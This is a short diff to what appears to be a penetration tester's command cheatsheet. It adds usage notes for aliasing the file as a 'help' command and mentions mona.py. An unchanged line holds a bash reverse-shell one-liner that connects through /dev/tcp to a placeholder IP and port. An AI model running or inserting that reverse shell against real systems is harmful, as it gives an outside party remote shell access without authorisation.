@@ -1,4 +1,9 @@
-CHEATSHEET!!!
+# Userful commands CHEATSHEET!!!
+
+# How to use this:  
+# step 1) Make scripts directory and copy the useful-commands file to the directory "mkdir /scripts && cp usefullcommands /scripts/"
+# step 2) add alias like this "alias help='cat /scripts/usefullcommands'"
+# just run this command in the terminal now: "help | grep <any-command-that-you-have-forgetten-like-mona>" it will print mona.py all commands.
 
 bash -i >& /dev/tcp/IP/PORT 0>&1
 
